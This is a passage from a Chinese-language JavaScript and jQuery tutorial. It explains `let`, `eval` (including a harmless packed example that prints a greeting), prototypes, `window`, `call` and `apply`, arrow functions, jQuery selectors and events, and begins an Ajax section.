class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name);  <span class="hljs-comment">// 直接报错, let变量不可以变量提升.</span><br>    <span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;大马猴&#x27;</span>; <br>&#125;<br><span class="hljs-title function_">fn</span>()<br></code></pre></td></tr></table></figure><pre><code class="hljs">  - 用let声明变量是新版本javascript提倡的一种声明变量的方案</code></pre><ul><li>let还有哪些作用呢? </li><li></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;周杰伦&quot;</span>;<br>    <span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;王力宏&quot;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name);<br>&#125;<br><span class="hljs-title function_">fn</span>()<br></code></pre></td></tr></table></figure><ul><li>显然一个变量被声明了两次. 这样也是不合理的. var本意是声明变量. 同一个东西. 被声明两次. 所以ES6规定. let声明的变量. 在同一个作用域内. 只能声明一次.</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">let</span> name = <span class="hljs-string">&quot;周杰伦&quot;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name);<br>    <span class="hljs-keyword">let</span> name = <span class="hljs-string">&quot;王力宏&quot;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name);<br>&#125;<br><span class="hljs-title function_">fn</span>()<br></code></pre></td></tr></table></figure><ul><li>注意, 报错是发生在代码检查阶段. 所以. 上述代码根本就执行不了. 在同一个作用域内. let声明的变量只能声明一次. 其他使用上和var没有差别. </li><li>eval函数 <ul><li>eval本身在js里面正常情况下使用的并不多. 但是很多网站会利用eval的特性来完成反爬操作. 我们来看看eval是个什么鬼? </li><li>从功能上讲, eval非常简单.  它可以动态的把字符串当成js代码进行运行.</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">s = <span class="hljs-string">&quot;console.log(&#x27;我爱你&#x27;)&quot;</span>;<br><span class="hljs-built_in">eval</span>(s);<br></code></pre></td></tr></table></figure><ul><li>也就是说. eval里面传递的应该是即将要执行的代码(字符串). 那么在页面中如果看到了eval加密该如何是好?  其实只要记住了一个事儿. 它里面不论多复杂. 一定是个字符串. </li><li>比如:</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p,a,c,k,e,d</span>)&#123;e=<span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<span class="hljs-keyword">return</span>(c&lt;a?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-title function_">e</span>(<span class="hljs-built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="hljs-number">35</span>?<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(c+<span class="hljs-number">29</span>):c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>))&#125;;<span class="hljs-keyword">if</span>(!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>,<span class="hljs-title class_">String</span>))&#123;<span class="hljs-keyword">while</span>(c--)d[<span class="hljs-title function_">e</span>(c)]=k[c]||<span class="hljs-title function_">e</span>(c);k=[<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> d[e]&#125;];e=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span><span class="hljs-string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="hljs-number">1</span>&#125;;<span class="hljs-keyword">while</span>(c--)<span class="hljs-keyword">if</span>(k[c])p=p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span>+<span class="hljs-title function_">e</span>(c)+<span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>),k[c]);<span class="hljs-keyword">return</span> p&#125;(<span class="hljs-string">&#x27;0.1(\&#x27;我爱你\&#x27;)&#x27;</span>,<span class="hljs-number">62</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;console|log&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>),<span class="hljs-number">0</span>,&#123;&#125;))<br></code></pre></td></tr></table></figure><ul><li>prototype(忽略) <ul><li>prototype是js里面给类增加功能扩展的一种模式. </li><li>写个类看看</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">People</span>(<span class="hljs-params">name, age</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">run</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>+<span class="hljs-string">&quot;在跑&quot;</span>)<br>    &#125;<br>&#125;<br><br>p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">18</span>);<br>p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-number">19</span>);<br><br>p1.<span class="hljs-title function_">run</span>();<br>p2.<span class="hljs-title function_">run</span>();<br></code></pre></td></tr></table></figure><ul><li>我现在代码写完了. 突然之间, 我感觉好像少了个功能. 人不应该就一个功能. 光会吃是不够的. 还得能够睡. 怎么办?  直接改代码?  可以. 但不够好. 如果这个类不是我写的呢? 随便改别人代码是很不礼貌的. 也很容易出错. 怎么办?  我们可以在我们自己代码中对某个类型动态增加功能. 此时就用到了prototype.</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">People</span>(<span class="hljs-params">name, age</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">run</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>+<span class="hljs-string">&quot;在跑&quot;</span>)<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 通过prototype可以给People增加功能</span><br><span class="hljs-title class_">People</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>+<span class="hljs-string">&quot;还可以sleep&quot;</span>);<br>&#125;<br><br>p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">18</span>);<br>p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;李四&quot;</span>, <span class="hljs-number">19</span>);<br><br>p1.<span class="hljs-title function_">run</span>();<br>p2.<span class="hljs-title function_">run</span>();<br><br>p1.<span class="hljs-title function_">sleep</span>();<br>p2.<span class="hljs-title function_">sleep</span>();<br></code></pre></td></tr></table></figure><ul><li><h2 id="内置对象：window-window对象是一个很神奇的东西-你可以把这东西理解成javascript全局的内置对象-如果我们默认不用任何东西访问一个标识符-那么默认认为是在用window对象"><a href="#内置对象：window-window对象是一个很神奇的东西-你可以把这东西理解成javascript全局的内置对象-如果我们默认不用任何东西访问一个标识符-那么默认认为是在用window对象" class="headerlink" title="内置对象：window -  window对象是一个很神奇的东西. 你可以把这东西理解成javascript全局的内置对象. 如果我们默认不用任何东西访问一个标识符. 那么默认认为是在用window对象. "></a>内置对象：window<br> -  window对象是一个很神奇的东西. 你可以把这东西理解成javascript全局的内置对象. 如果我们默认不用任何东西访问一个标识符. 那么默认认为是在用window对象. </h2></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">mm</span> = <span class="hljs-string">&quot;爱你&quot;</span> <span class="hljs-comment">//定义了一个全局变量</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mm);<br></code></pre></td></tr></table></figure><ul><li>综上,  我们可以得出一个结论. 全局变量可以用window.xxx来表示. </li><li>想要在函数外部调用该函数内部定义的一个内置函数，不可使用返回值的机制，如何实现？</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">let</span> chi = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;我是吃&quot;</span>)<br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">w_chi</span> = chi <span class="hljs-comment">//全局变量chi</span><br>&#125;)();<br><span class="hljs-comment">//如何调用</span><br><span class="hljs-title function_">w_chi</span>() <span class="hljs-comment">//chi()</span><br><br><span class="hljs-comment">//换一种写法. 你还认识么?</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">w</span>)&#123;<br>    <span class="hljs-keyword">let</span> chi = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;我是吃&quot;</span>)<br>    &#125;<br>    w.<span class="hljs-property">chi</span> = chi<br>&#125;)(<span class="hljs-variable language_">window</span>);<br><span class="hljs-title function_">chi</span>()<br></code></pre></td></tr></table></figure><ul><li>call和apply(忽略) <ul><li>在运行时. 正常的js调用:</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">People</span>(<span class="hljs-params">name, age</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">what_1, what_2</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>, <span class="hljs-string">&quot;在吃&quot;</span>, what_1, what_2)<br>    &#125;<br>&#125;<br>p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;alex&quot;</span>, <span class="hljs-number">18</span>);<br>p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;wusir&quot;</span>, <span class="hljs-number">20</span>);<br>p1.<span class="hljs-title function_">chi</span>(<span class="hljs-string">&quot;馒头&quot;</span>, <span class="hljs-string">&quot;大饼&quot;</span>);<br>p2.<span class="hljs-title function_">chi</span>(<span class="hljs-string">&quot;大米饭&quot;</span>, <span class="hljs-string">&quot;金坷垃&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">People</span>(<span class="hljs-params">name, age</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">what_1, what_2</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>, <span class="hljs-string">&quot;在吃&quot;</span>, what_1, what_2);<br>    &#125;<br>&#125;<br>p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;alex&quot;</span>, <span class="hljs-number">18</span>);<br>p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>(<span class="hljs-string">&quot;wusir&quot;</span>, <span class="hljs-number">20</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params">what_1, what_2</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>, <span class="hljs-string">&quot;在吃&quot;</span>, what_1, what_2);<br>&#125;<br>eat.<span class="hljs-title function_">call</span>(p1, <span class="hljs-string">&quot;馒头&quot;</span>, <span class="hljs-string">&quot;大饼&quot;</span>);<br>eat.<span class="hljs-title function_">call</span>(p2, <span class="hljs-string">&quot;大米饭&quot;</span>, <span class="hljs-string">&quot;金坷垃&quot;</span>);<br><br><br><span class="hljs-comment">// call的语法是: 函数名.call(对象, 参数1, 参数2, 参数3....)</span><br><span class="hljs-comment">// 执行逻辑是: 执行函数. 并把对象传递给函数中的this.  其他参数照常传递给函数</span><br></code></pre></td></tr></table></figure><ul><li>apply和他几乎一模一样. 区别是: apply传递参数要求是一个数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">eat.<span class="hljs-title function_">apply</span>(p1, [<span class="hljs-string">&quot;苞米茬子&quot;</span>, <span class="hljs-string">&quot;大饼子&quot;</span>]);<br></code></pre></td></tr></table></figure><ul><li>ES6中的箭头函数 <ul><li>在ES6中简化了函数的声明语法.</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fn = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">let</span> num=<span class="hljs-number">10</span>&#125;;<br><span class="hljs-keyword">var</span> <span class="hljs-title function_">fn</span> = (<span class="hljs-params"></span>) =&gt; &#123;<span class="hljs-keyword">let</span> num=<span class="hljs-number">10</span>&#125;;<br><br><span class="hljs-keyword">var</span> fn = <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>)&#123;&#125;<br><span class="hljs-keyword">var</span> <span class="hljs-title function_">fn</span> = name =&gt; &#123;&#125;<br><span class="hljs-keyword">var</span> <span class="hljs-title function_">fn</span> = (<span class="hljs-params">name</span>) =&gt; &#123;&#125;<br><br><span class="hljs-keyword">var</span> fn = <span class="hljs-keyword">function</span>(<span class="hljs-params">name, age</span>)&#123;&#125;<br><span class="hljs-keyword">var</span> <span class="hljs-title function_">fn</span> = (<span class="hljs-params">name, age</span>) =&gt; &#123;&#125;<br></code></pre></td></tr></table></figure><p><a name="5b71df76"></a></p><h1 id="第5章-、jQuery"><a href="#第5章-、jQuery" class="headerlink" title="第5章 、jQuery"></a>第5章 、jQuery</h1><p><a name="3379baec"></a></p><h2 id="5-1、jQuery介绍"><a href="#5-1、jQuery介绍" class="headerlink" title="5.1、jQuery介绍"></a>5.1、jQuery介绍</h2><ul><li>jQuery是什么</li></ul><p>jQuery是一个快速、简洁的JavaScript框架。jQuery设计的宗旨是“write Less，Do More”，即倡导写更少的代码，做更多的事情。它封装JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理等功能。</p><p>jQuery兼容各种主流浏览器，如IE 6.0+、FF 1.5+、Safari 2.0+、Opera 9.0+等</p><ul><li>jQuery的版本</li></ul><p>目前在市场上, 1.x , 2.x, 3.x 功能的完善在1.x, 2.x的时候是属于删除旧代码,去除对于旧的浏览器兼容代码。3.x的时候增加es的新特性以及调整核心代码的结构</p><ul><li>jQuery的引入</li></ul><p>根本上jquery就是一个写好的js文件,所以想要使用jQuery的语法必须先引入到本地</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="af7514e6"></a></p><h2 id="5-2、jQuery的选择器"><a href="#5-2、jQuery的选择器" class="headerlink" title="5.2、jQuery的选择器"></a>5.2、jQuery的选择器</h2><p><a name="ab9cc675"></a></p><h3 id="5-2-1、直接查找"><a href="#5-2-1、直接查找" class="headerlink" title="5.2.1、直接查找"></a>5.2.1、直接查找</h3><ul><li>基本选择器</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">#id         # id选择符 </span><br><span class="hljs-comment">element     # 元素选择符</span><br><span class="hljs-comment">.class      # class选择符  </span><br><span class="hljs-comment">selector1, selector2, selectorN   # 同时获取多个元素的选择符 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">jQ选择器：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">$(&quot;#id&quot;)   == document.getElementById(&#x27;id&#x27;)</span><br><span class="hljs-comment">$(&quot;.class&quot;)  </span><br><span class="hljs-comment">$(&quot;element&quot;)  </span><br><span class="hljs-comment">$(&quot;.class,p,div&quot;)</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><a name="28b39a2b"></a></p><h2 id="5-3、jQuery的事件绑定"><a href="#5-3、jQuery的事件绑定" class="headerlink" title="5.3、jQuery的事件绑定"></a>5.3、jQuery的事件绑定</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">用法:</span><br><span class="hljs-comment">直接通过事件名来进行调用</span><br><span class="hljs-comment">  $().事件名(匿名函数)</span><br><span class="hljs-comment">   </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>案例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;d1&quot;</span>&gt;</span>i am div tag<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;t&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    $(<span class="hljs-string">&#x27;#d1&#x27;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;点击了div标签！&#x27;</span>)</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    $(<span class="hljs-string">&#x27;#t&#x27;</span>).<span class="hljs-title function_">blur</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;写完了吗？&#x27;</span>)</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="fad4a4ad"></a></p><h2 id="5-4-Ajax请求"><a href="#5-4-Ajax请求" class="headerlink" title="5.4 Ajax请求"></a>5.4 Ajax请求</h2><ul><li><h2 id="什么是ajax？-AJAX-异步的javascript和XML（Asynchronous-Javascript-and-XML）-它不是一门编程语言，而是利用JavaScript在保证页面不被刷新、页面链接不改变的情况下与服务器交换数据并更新部分网页的技术。-对于传统的网页，如果想更新内容，那么必须要刷新整个页面，但有了Ajax，便可以在页面不被全部刷新的情况下更新其内容。在这个过程中，页面实际上是在后台与服务器进行了数据交互，获得数据之后，再利用JavaScript改变页面，这样页面内容就会更新了。（微博页面加载过程的例子，加载一会下方才会出现内容，这其实就是Ajax加载的过程。）-简言之，在不重载整个网页的情况下，AJAX通过后台加载数据，并在网页上进行显示。-通过-jQuery-AJAX-方法，您能够使用-HTTP-Get-和-HTTP-Post-从远程服务器上请求文本、HTML、XML-或-JSON-同时您能够把这些外部数据直接载入网页的被选元素中。"><a href="#什么是ajax？-AJAX-异步的javascript和XML（Asynchronous-Javascript-and-XML）-它不是一门编程语言，而是利用JavaScript在保证页面不被刷新、页面链接不改变的情况下与服务器交换数据并更新部分网页的技术。-对于传统的网页，如果想更新内容，那么必须要刷新整个页面，但有了Ajax，便可以在页面不被全部刷新的情况下更新其内容。在这个过程中，页面实际上是在后台与服务器进行了数据交互，获得数据之后，再利用JavaScript改变页面，这样页面内容就会更新了。（微博页面加载过程的例子，加载一会下方才会出现内容，这其实就是Ajax加载的过程。）-简言之，在不重载整个网页的情况下，AJAX通过后台加载数据，并在网页上进行显示。-通过-jQuery-AJAX-方法，您能够使用-HTTP-Get-和-HTTP-Post-从远程服务器上请求文本、HTML、XML-或-JSON-同时您能够把这些外部数据直接载入网页的被选元素中。" class="headerlink" title="什么是ajax？ -  AJAX &#x3D; 异步的javascript和XML（Asynchronous Javascript and XML） -  它不是一门编程语言，而是利用JavaScript在保证页面不被刷新、页面链接不改变的情况下与服务器交换数据并更新部分网页的技术。 -  对于传统的网页，如果想更新内容，那么必须要刷新整个页面，但有了Ajax，便可以在页面不被全部刷新的情况下更新其内容。在这个过程中，页面实际上是在后台与服务器进行了数据交互，获得数据之后，再利用JavaScript改变页面，这样页面内容就会更新了。（微博页面加载过程的例子，加载一会下方才会出现内容，这其实就是Ajax加载的过程。） -  简言之，在不重载整个网页的情况下，AJAX通过后台加载数据，并在网页上进行显示。 -  通过 jQuery AJAX 方法，您能够使用 HTTP Get 和 HTTP Post 从远程服务器上请求文本、HTML、XML 或 JSON - 同时您能够把这些外部数据直接载入网页的被选元素中。 "></a>什么是ajax？<br> -  AJAX &#x3D; 异步的javascript和XML（Asynchronous Javascript and XML）<br> -  它不是一门编程语言，而是利用JavaScript在保证页面不被刷新、页面链接不改变的情况下与服务器交换数据并更新部分网页的技术。<br> -  对于传统的网页，如果想更新内容，那么必须要刷新整个页面，但有了Ajax，便可以在页面不被全部刷新的情况下更新其内容。在这个过程中，页面实际上是在后台与服务器进行了数据交互，获得数据之后，再利用JavaScript改变页面，这样页面内容就会更新了。（微博页面加载过程的例子，加载一会下方才会出现内容，这其实就是Ajax加载的过程。）<br> -  简言之，在不重载整个网页的情况下，AJAX通过后台加载数据，并在网页上进行显示。<br> -  通过 jQuery AJAX 方法，您能够使用 HTTP Get 和 HTTP Post 从远程服务器上请求文本、HTML、XML 或 JSON - 同时您能够把这些外部数据直接载入网页的被选元素中。 </h2></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//get()方式</span><br>  $.<span class="hljs-title function_">ajax</span>(&#123;<br>     <span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;./data/index.txt&#x27;</span>,<br>     <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;get&#x27;</span>,<br>     <span class="hljs-attr">dataType</span>:<span class="hljs-string">&#x27;text&#x27;</span>,<br>     <span class="hljs-attr">success</span>:<span 